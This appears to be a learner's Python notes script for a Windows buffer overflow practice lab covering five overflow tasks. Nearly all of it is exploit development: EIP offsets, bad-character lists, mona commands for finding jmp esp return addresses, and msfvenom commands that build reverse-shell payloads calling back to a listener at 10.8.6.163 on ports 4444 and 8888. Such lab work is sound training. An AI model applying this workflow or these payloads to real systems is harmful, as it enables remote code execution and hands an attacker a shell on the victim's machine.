#!/bin/python3

import binascii
from utils import *

'''

* OVERFLOW 1:

0BADF00D       EIP contains normal pattern : 0x6f43396e (offset 1978)
0BADF00D       ESP (0x01acfa30) points at offset 1982 in normal pattern (length 418)
0BADF00D       EBP contains normal pattern : 0x43386e43 (offset 1974)
0BADF00D       EBX contains normal pattern : 0x376e4336 (offset 1970)

\x01\x02\x03\x04\x05\x06\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff



ESP 018CFA30
EIP 42424242

BadChars=
\x00\x07\x08\x2e\x2f\xa0\xa1

'''

generate_bytearray()
print()

# ------
# !mona jmp -r esp -cpb "\x00\x07\x08\x2e\x2f\xa0\xa1"

'''
625011AF     0x625011af : jmp esp | 
625011BB     0x625011bb : jmp esp | 
625011C7     0x625011c7 : jmp esp | 
625011D3     0x625011d3 : jmp esp | 
625011DF     0x625011df : jmp esp | 
625011EB     0x625011eb : jmp esp | 
625011F7     0x625011f7 : jmp esp | 
62501203     0x62501203 : jmp esp |
62501205     0x62501205 : jmp esp |

'''

print('OVERFLOW1 retn Address:')
hex2bytes("625011BB")

# Generate Payload
# msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00\x07\x08\x2e\x2f\xa0\xa1" -f c

# ----------------------------------------------------------------------------------------

## OVERFLOW 2

# Crashed on 700 bytes

# EIP address: 76413176
# Offset: 634
# Message=    EIP contains normal pattern : 0x76413176 (offset 634)

# ESP address: 0x0189FA30
# BadChars=00 23 24 3c 3d 83 84 ba bb
# \x00\x23\x24\x3c\x3d\x83\x84\xba\xbb

# New ESP after removing the bad chars
# ESP: 0195FA30 

# jumps
# 625011AF     0x625011af : jmp esp 
# 625011C7     0x625011c7 : jmp esp 
# 625011D3     0x625011d3 : jmp esp 
# 625011DF     0x625011df : jmp esp 
# 625011EB     0x625011eb : jmp esp 
# 625011F7     0x625011f7 : jmp esp 
# 62501203     0x62501203 : jmp esp 
# 62501205     0x62501205 : jmp esp 

print("OVERFLOW 2: retn Address")
hex2bytes("625011AF")

# Generate RevShell 
# msfvenom -p windows/shell_reverse_tcp LHOST=10.8.6.163 LPORT=4444 EXITFUNC=thread -b "\x00\x23\x24\x3c\x3d\x83\x84\xba\xbb" -f c

# ----------------------------------------------------------------------------------------

## OVERFLOW 3

# Fuzzing crashed at 1300 bytes

# EIP contains normal pattern : 0x35714234 (offset 1274)
# ESP : 01B0FA30
# Bad chars: 11 12 40 41 5f 60 b8 b9 ee ef
# \x11\x12\x40\x41\x5f\x60\xb8\xb9\xee\xef

# New ESP: 0x01A2FA30
# !mona jmp -r esp -cpb "\x00\x11\x40\x5f\xb8\xee"

# Result:
# 0x62501203 : jmp esp |
# 0x62501205 : jmp esp |

print("OVERFLOW3 Address")
hex2bytes("62501205")

# Generate RevShell 
# msfvenom -p windows/shell_reverse_tcp LHOST=10.8.6.163 LPORT=8888 EXITFUNC=thread -b "\x00\x11\x12\x40\x41\x5f\x60\xb8\xb9\xee\xef" -f c

# ------------------------------------------------------------------------------------------------------------------------------------------

## Overflow 4

# Fuzzing crashed at 2100 bytes

# EIP contains normal pattern : 0x70433570 (offset 2026)
# ESP: 0x019EFA30
# Bad chars: 00 a9 aa cd ce d4 d5
# \x00\xa9\xaa\xcd\xce\xd4\xd5

# New ESP: 0x0192FA30
# !mona jmp -r esp -cpb "\x00\xa9\xaa\xcd\xce\xd4\xd5"

# Result
#  625011AF     0x625011af : jmp esp |
#  625011BB     0x625011bb : jmp esp |
#  625011C7     0x625011c7 : jmp esp |
#  625011D3     0x625011d3 : jmp esp |
#  625011DF     0x625011df : jmp esp |
#  625011EB     0x625011eb : jmp esp |
#  625011F7     0x625011f7 : jmp esp |
#  62501203     0x62501203 : jmp esp |
#  62501205     0x62501205 : jmp esp |

print("OVERFLOW4")
hex2bytes("625011AF")

# --------------------------------------------------------------------------------------

# Using the method as before we answer the rest of the tasks
#......

# --------------------------------------------------------------------------------------
## OVERFLOW 5

# EIP contains normal pattern : 0x356b4134 (offset 314)
# ESP: 0x01A6FA30
# Bad chars: 00 16 17 2f 30 f4 f5 fd
# \x00\x16\x17\x2f\x30\xf4\xf5\xfd

# New ESP: 0x019BFA30

# find jumps

# !mona jmp -r esp -cpb \x00\x16\x17\x2f\x30\xf4\xf5\xfd
# 0x625011af : jmp esp |
print("OVERFLOW5")
hex2bytes("625011af")

# Generate RevShell
# msfvenom -p windows/shell_reverse_tcp LHOST=10.8.6.163 LPORT=8888 EXITFUNC=thread -b "\x00\x16\x17\x2f\x30\xf4\xf5\xfd" -f c